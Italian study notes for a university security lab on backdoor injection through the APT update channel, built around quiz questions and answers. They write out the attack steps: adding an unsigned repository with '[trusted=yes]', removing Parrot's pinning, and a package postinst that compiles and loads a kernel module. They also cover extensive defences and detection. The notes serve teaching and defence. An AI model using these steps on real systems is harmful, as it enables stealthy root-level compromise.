# Appunti — Modulo S7: LAB Backdoor injection

**Corso**: Lab Sicurezza Informatica T
**Lezione di riferimento**: `lezione_moduloS7_backdoor_injection.md`
**Fonte lab**: `SLIDE LAB/SICINF/LAB_Backdoor_injection_15apr.html`
**Stato**: modulo mai studiato prima — nessun appunto grezzo di Lorenzo. Questi appunti simulano la lettura critica ("il *perché*, non la memorizzazione"; caccia attiva alle distinzioni simili-ma-diverse) in vista del quiz teorico che copre tutto il programma, comandi di lab inclusi.

> ⚠️ Nessun appunto grezzo esistente per questo modulo: le domande sotto sono ricostruite dal profilo di studio (quelle che Lorenzo porrebbe leggendo la fonte). Il lab **non è stato eseguito su VM** — qui si consolida la comprensione teorica dei meccanismi, non un'esecuzione pratica.

---

## L'idea di fondo: l'update come vettore

L'attacco non "buca" il sistema: **avvelena il canale di aggiornamento**, di cui il sistema si fida per definizione. Chi controlla un pacchetto ottiene esecuzione come root, perché installare un pacchetto significa (anche) eseguire i suoi script come root.

> **Domanda**: ma quindi l'attaccante deve già essere root per scrivere `evil.list` in `/etc/apt/sources.list.d/`? Se è già root, che senso ha "attaccare"?
> **Risposta**: sì, per *questo esercizio didattico* si parte lavorando come `root` sulla VM — è un banco di prova per *capire il meccanismo*, non una compromissione da zero. Nella realtà la scrittura della sorgente malevola arriva a monte: uno script di installazione che l'utente lancia con `sudo`, un pacchetto di terze parti che aggiunge il suo repo, una compromissione parziale che vuole *consolidarsi*. Il valore dell'attacco è il **salto di profondità**: da un accesso qualsiasi a una **persistenza a livello kernel**, invisibile e resistente. Il modulo insegna cosa succede *dopo* che si è messo piede nel canale, non come ci si entra.

---

## Tappa 1 — Il repository malevolo e i due controlli di APT

Riga aggiunta in `/etc/apt/sources.list.d/evil.list`:

```
deb [trusted=yes] http://darma.ing.unibo.it/debian-repo ./
```

Poi si sposta via il pinning di Parrot e si aggiornano gli indici:

```bash
mv /etc/apt/preferences.d/parrot-pinning /root
apt update
```

> **Domanda**: `[trusted=yes]` e lo spostamento del `parrot-pinning` mi sembrano "due modi di dire ad APT: fidati". Fanno la stessa cosa?
> **Risposta**: no, ed è **la** distinzione da non sbagliare al quiz. Sono due controlli **ortogonali** di APT:
> - `[trusted=yes]` agisce sull'**autenticazione**: normalmente APT pretende che il repo sia firmato GPG (file `Release`/`InRelease` firmato con una chiave nota) e rifiuta i pacchetti se la firma non torna. `[trusted=yes]` disattiva *questo controllo* — "accetta anche se non firmato".
> - Il **pinning** (i file in `/etc/apt/preferences.d/`) agisce sulla **priorità**: a parità di pacchetto disponibile in più repo, decide *quale sorgente/versione* preferire. Parrot dà priorità più alta ai suoi repo; togliendo quel file, tutte le sorgenti tornano a priorità 500 e vince chi ha la versione più alta.
> Sintesi mnemonica: **firma = "SE posso prendere questo pacchetto"; pinning = "QUALE pacchetto scelgo tra quelli ammissibili"**. L'attacco deve battere entrambi: `[trusted=yes]` per la firma, `mv` del pinning per la priorità.

> **Domanda**: cosa vuol dire `[trusted=yes]` "in chiaro"? È come `sudo` per apt?
> **Risposta**: no. Non aumenta i privilegi (apt gira già come root); **abbassa la barra di verifica**. Senza quel flag, APT scaricando dal repo non firmato direbbe qualcosa come "il repository non è firmato / autenticazione fallita" e si fermerebbe o chiederebbe conferma. `[trusted=yes]` sopprime quel controllo. Nella pratica difensiva reale: le sorgenti serie si autenticano con `signed-by=/percorso/chiave.gpg`; `[trusted=yes]` sotto `sources.list.d/` è un **indicatore di compromissione** da cercare.

> **Domanda**: perché il lab dice che il pinning "è una buona idea, ed eviterebbe l'infezione"? Se è una difesa, perché Parrot ce l'ha ma poi la togliamo?
> **Risposta**: proprio perché è una difesa *reale e attiva di serie*: costringe APT a preferire i repo ufficiali di Parrot anche di fronte a una versione più recente altrove. Il lab **la deve disattivare a mano** perché l'attacco possa funzionare — cioè dimostra che senza quella disattivazione l'infezione non passerebbe. È un modo per farti vedere *quale* protezione stai aggirando.

> **Domanda**: `apt update` a questo punto installa la backdoor?
> **Risposta**: no. `apt update` scarica **solo gli indici** (la lista di "cosa è disponibile e in che versione") da tutte le sorgenti. Dopo, APT *sa* che dal repo malevolo esiste un `bash` più nuovo, ma non ha ancora toccato nulla sul sistema. Distinzione da tenere ferma:
> - `apt update` → aggiorna la **lista** dei pacchetti disponibili;
> - `apt upgrade` → **installa** tutti gli aggiornamenti disponibili;
> - `apt install <pkg>` → installa/aggiorna **un** pacchetto specifico.

---

## Tappa 2 — Il trucco della versione

`apt install bash` scarica il pacchetto malevolo perché dichiara versione **5.2.37-2+b9** contro **+b7 installata** e **+b8 ufficiale**.

> **Domanda**: cosa significano quei `+b7 / +b8 / +b9`? Sono versioni diverse di bash?
> **Risposta**: la versione "vera" di bash è la stessa (`5.2.37-2`); il suffisso `+bN` è il **binary rebuild** (una ricompilazione del *pacchetto* senza cambiare il sorgente). Ai fini della scelta conta solo l'ordinamento: `dpkg` confronta i numeri di versione e `+b9 > +b8 > +b7`. L'attaccante non ha inventato una versione nuova di bash: ha pubblicato un pacchetto con un numero **appena più alto** di quello ufficiale. Con pinning tolto e firma bypassata, "più alto" basta a farlo scegliere.

> **Domanda**: il lab dice che il pacchetto è "aggiornato, non installato". Perché questa distinzione conta per l'attaccante?
> **Risposta**: perché la **furtività** cambia. `bash` è già presente su ogni sistema: quindi non compare un pacchetto *nuovo e sospetto*, compare un *aggiornamento* di un pacchetto core.
> - Con `apt upgrade`, questo update si sarebbe **mescolato all'aggiornamento di ~180 altri pacchetti** — invisibile nel mucchio.
> - Con gli **aggiornamenti automatici** (unattended-upgrades), sarebbe potuto avvenire **in background**, senza che nessuno lanci un comando.
> Per il difensore l'anomalia non è "un file strano" ma "`bash` aggiornato da una sorgente non ufficiale a una versione che l'upstream non ha mai rilasciato" — visibile in `apt-cache policy bash` e nei log `/var/log/apt/history.log`, `/var/log/dpkg.log`.

---

## Tappa 3 — Come un `.deb` esegue codice

Il pacchetto, installandosi, esegue (come root, da solo):

```bash
cd /usr/share/badmodule
make
insmod ./root.ko
```

E dichiara `Depends: ... build-essential, linux-headers-amd64`.

> **Domanda**: chi lancia quei tre comandi? Io ho scritto solo `apt install bash`.
> **Risposta**: li lancia **`dpkg`, automaticamente**, tramite i *maintainer scripts* del pacchetto. Un `.deb` contiene due parti: i **file da installare** (il *data*) e le **info di controllo** (il *control*), tra cui script chiamati `preinst`, `postinst`, `prerm`, `postrm`. `dpkg` li esegue prima/dopo l'installazione o rimozione — **come root**. I tre comandi stanno nel `postinst`: eseguiti a fine installazione senza che tu li digiti. Questo è il meccanismo centrale del modulo.

> **Domanda**: quindi non è un bug di apt? Sembra troppo facile.
> **Risposta**: esatto, **non è un bug, è il design**. I maintainer scripts servono a cose legittime e necessarie (creare utenti di sistema, avviare demoni, compilare moduli DKMS). L'esecuzione di codice root all'installazione è *prevista*. L'attacco sfrutta una funzionalità, non una vulnerabilità — ed è per questo che è così potente: cade l'idea che "un pacchetto è solo un insieme di file da copiare". Accettare un pacchetto = accettare di eseguirne gli script come root.

> **Domanda**: cosa c'entrano `build-essential` e `linux-headers-amd64`? bash non ha bisogno di un compilatore.
> **Risposta**: infatti **non sono dipendenze vere di bash** — servono al *payload*. `build-essential` porta `gcc`/`make`, `linux-headers-amd64` porta gli header del kernel. Servono perché il `postinst` **compila** (`make`) e **carica** (`insmod`) un modulo kernel, e per farlo servono compilatore e header del kernel in esecuzione. L'attaccante **coopta il risolutore di dipendenze** di APT: dichiarandole in `Depends`, se le fa installare *da APT stesso* in automatico. Rovescio della medaglia per il difensore: un "aggiornamento di bash" che tira dentro `build-essential` e `linux-headers` è palesemente incoerente → red flag.

> **Domanda**: perché compilare il modulo *sul mio PC* invece di consegnarmelo già pronto nel pacchetto?
> **Risposta**: perché un modulo kernel deve corrispondere **esattamente alla versione del kernel** su cui viene caricato — un `.ko` precompilato per un altro kernel non si caricherebbe. Compilando *in loco* contro gli header locali (`linux-headers-amd64`), il modulo risulta compatibile su qualunque VM/kernel: l'attacco diventa **portabile** senza dover impacchettare un `.ko` per ogni possibile kernel.

---

## Tappa 4 — La backdoor è un modulo kernel (LKM)

Payload lasciato in `/usr/share/badmodule/`; il modulo compilato è `root.ko`, caricato con `insmod`.

> **Domanda**: cos'è un "modulo kernel" e perché è più grave di un normale programma malevolo?
> **Risposta**: un **LKM (Loadable Kernel Module)** è codice caricato **dentro il kernel a runtime** (senza riavvio) ed eseguito in **ring 0**, lo stesso livello di privilegio del kernel. La differenza con una backdoor *userspace* (un processo, un cron, una shell nascosta):
> - una backdoor userspace vive *sopra* il kernel → la vedi e la uccidi con `ps`, `kill`, ecc.;
> - una backdoor **kernel** vive *dentro* l'osservatore → può intercettare le system call (hooking) e **nascondere sé stessa** da `lsmod`, nascondere processi da `ps`, file da `ls`, connessioni da `ss`. È il codice stesso a rispondere alle domande degli strumenti di ispezione.
> È la base dei **rootkit kernel**: privilegio massimo + persistenza + invisibilità.

> **Domanda**: i comandi da ricordare per i moduli quali sono?
> **Risposta**: `insmod ./root.ko` carica un modulo dal file indicato; `lsmod` (o `cat /proc/modules`) li elenca; `rmmod` li rimuove; `make` + `linux-headers` + `build-essential` è la toolchain per produrre il `.ko`. Nota: `insmod` prende un **file preciso**; il "fratello maggiore" `modprobe` risolve invece nomi e dipendenze dei moduli dai percorsi standard — nel lab si usa `insmod` perché il `.ko` è appena compilato lì, in una cartella non standard.

---

## Tappa 5 — Secure Boot e firma dei moduli

Il lab: l'iniezione riesce perché **Parrot parte senza Secure Boot**, quindi carica moduli anche non autenticati; su un sistema con Secure Boot (es. Ubuntu) la injection ha successo ma **il modulo non viene caricato**.

> **Domanda**: "Secure Boot" e "firma dei moduli" sono la stessa cosa? Il lab li nomina insieme.
> **Risposta**: sono **collegati ma distinti** — altra distinzione da presidiare:
> - **Secure Boot** (UEFI): il *firmware* verifica la firma di ogni anello della catena d'avvio (bootloader → kernel), così parte solo *un kernel autentico*.
> - **Firma dei moduli** (module signing): quando Secure Boot è attivo, il *kernel* entra in *lockdown* e applica `module.sig_enforce`, **rifiutando di caricare moduli non firmati** con una chiave fidata (nel db UEFI o registrata come MOK, Machine Owner Key).
> Secure Boot protegge *l'avvio del kernel*; la firma dei moduli protegge *ciò che il kernel carica dopo*. Nel lab è il secondo a fermare l'attacco, ma è Secure Boot ad "accenderlo".

> **Domanda**: quindi con Secure Boot l'`apt install` fallirebbe?
> **Risposta**: **no, e questo è il punto più facile da sbagliare al quiz**. L'`apt install` **riesce**, il `postinst` gira, `make` **compila** il modulo. È l'**ultimo** passo, `insmod ./root.ko`, a essere **bloccato dal kernel** perché il modulo non è firmato (errore tipo `Key was rejected by service`). La *software injection* ha successo; è il *caricamento del modulo* a fallire. La catena si spezza sull'`insmod`, non sull'`apt`.

> **Domanda**: se Parrot non può fare Secure Boot, un difensore su Parrot è senza difese a questo strato?
> **Risposta**: non del tutto. Se manca Secure Boot restano contromisure equivalenti sul caricamento moduli: `sysctl kernel.modules_disabled=1` (dopo il boot, impedisce ogni ulteriore `insmod`/`modprobe`) o il kernel *lockdown*. Ma è vero che *nella configurazione del lab* quello strato manca ed è precisamente perché l'`insmod` riesce.

---

## Difesa: prevenzione vs rilevazione (e una trappola)

> **Domanda**: mettendo tutto insieme, come mi difendo — e come me ne accorgo *dopo*?
> **Risposta**:
> **Prevenire**: mai `[trusted=yes]` (usare `signed-by=` con chiavi note); mantenere il pinning e l'integrità di `/etc/apt/`; Secure Boot + `module.sig_enforce` o `kernel.modules_disabled=1`; niente autoupdate da sorgenti non verificate.
> **Rilevare**: `apt-cache policy bash` (da che repo arriva il candidato) e i log `/var/log/apt/history.log`, `/var/log/dpkg.log`; **integrity check con baseline noto-buona** (AIDE) su `/usr/bin`, `/usr/share`, `/lib/modules`.

> **Domanda**: `debsums` e `AIDE` sono la stessa cosa? Entrambi controllano l'integrità dei file.
> **Risposta**: no, e la differenza è **l'ancora di fiducia** — distinzione sottile ma da quiz:
> - `debsums` verifica i file installati **contro il manifest del pacchetto stesso** (gli hash che il `.deb` dichiara). Il pacchetto malevolo è *coerente con il proprio manifest* → `debsums` **non lo segnala**.
> - **AIDE** confronta lo stato attuale contro un **database baseline creato prima** su sistema pulito (indipendente dai pacchetti). I file nuovi (`/usr/share/badmodule/`, `root.ko`) e il `bash` sostituito → **rilevati**.
> In una riga: `debsums` chiede "corrispondi a ciò che *tu* dichiari?", AIDE chiede "corrispondi a com'eri *prima*?". Contro un pacchetto malevolo coerente con sé stesso, solo la seconda domanda funziona. (È esattamente l'AIDE del lab S11.) Attenzione anche al fatto che, una volta caricato il modulo, `lsmod`/`ps` possono essere ingannati: la rilevazione affidabile è da baseline esterna/offline.

---

## Connessioni

> ⚠️ Sezione non presente in appunti grezzi (non esistono per questo modulo).

- **S11 — Integrity check e privilege escalation** (svolto, lab `change1`…`change5`): collegamento diretto. In S11 la strategia difensiva era **AIDE**: database del sottoalbero `/usr/bin` sul sistema pulito → lancio del "malware" → confronto per rilevare la modifica (lì: bit **SUID** su `cp`). Identica difesa applicabile qui contro `apt install bash`. Sul lato offensivo, S11 e S7 sono due gradini della **persistenza dell'attaccante**: S11 resta in **userspace** (SUID su `cp`, poi utente `toor` uid 0 iniettato in `/etc/passwd`+`/etc/shadow`), S7 sale al **kernel** (LKM) — più profondo e più difficile da rilevare, perché può occultarsi agli stessi strumenti userspace usati in S11 per indagare.
- **S10 — Network Intrusion Detection** (svolto, Wireshark + Suricata): (1) il pacchetto arriva via **`http://` in chiaro** da un repo non ufficiale → un monitor di rete può segnalarlo; (2) una backdoor kernel apre tipicamente un canale C2/reverse shell → è il traffico anomalo che un NIDS rileva. Integrity check guarda il **disco**, NIDS guarda la **rete**.
- **S5 — Firewall (iptables/nftables)**: un firewall d'uscita default-deny potrebbe bloccare sia il fetch dal repo malevolo sia il callback della backdoor. Firewall = prevenzione perimetrale; NIDS = rilevazione di rete; integrity check = rilevazione a terra.

---

## Domande di autoverifica — Risposte

> ⚠️ Sezione non presente in appunti grezzi. Risposte al quiz della lezione (`lezione_moduloS7_backdoor_injection.md`), da rifare a mente prima dell'esame.

1. **Falso** — `apt update` scarica solo gli indici; non installa.
2. **Falso** — `[trusted=yes]` *disabilita* la verifica della firma, non la rafforza.
3. **Falso** — il pinning riguarda la priorità/selezione della versione, non l'autenticazione (quella la bypassa `[trusted=yes]`).
4. **(b)** — versione più alta + pinning rimosso + firma bypassata.
5. **Vero** — via maintainer scripts (`postinst`) eseguiti da `dpkg` come root.
6. **(b)** — servono a compilare/caricare il modulo; APT le installa in automatico via `Depends`.
7. **Vero** — modulo in ring 0, può auto-occultarsi e nascondere processi/file/connessioni.
8. **Falso** — installazione e compilazione riescono; è l'`insmod` a essere bloccato dal kernel.
9. **(b)** — `debsums` verifica contro il manifest del pacchetto stesso, con cui il malware è coerente; serve una baseline indipendente (AIDE).
10. **Vero** — manca Secure Boot su Parrot, quindi manca la firma-enforcement dei moduli: `insmod` passa.

---

## Riepilogo

> ⚠️ Sezione non presente in appunti grezzi.

- Attacco alla **catena di fiducia del package manager**: `[trusted=yes]` (firma) + rimozione pinning (priorità) + versione più alta → il pacchetto malevolo diventa "l'aggiornamento" di `bash`.
- Un `.deb` **esegue codice come root** all'installazione via maintainer scripts; le `Depends` (`build-essential`, `linux-headers`) si tirano dietro la toolchain per compilare/caricare un **modulo kernel** — persistenza in ring 0, invisibile.
- Difesa in profondità: repo firmati + pinning (ingresso), consapevolezza che installare = eseguire (esecuzione), **firma dei moduli sotto Secure Boot** (effetto finale, assente su Parrot).
- Rilevazione: baseline indipendente (**AIDE**, come S11), non `debsums`; provenienza via `apt-cache policy`; il NIDS (S10) intercetta il traffico della backdoor.
- Distinzioni chiave da non confondere al quiz: firma≠pinning; `apt update`≠`upgrade`≠`install`; Secure Boot≠firma dei moduli; l'`insmod` (non l'`apt install`) è ciò che Secure Boot blocca; `debsums`≠AIDE (manifest del pacchetto vs baseline noto-buona); backdoor userspace≠kernel.

<!-- AUTO-LINKS:START -->
<!-- AUTO-LINKS:END -->
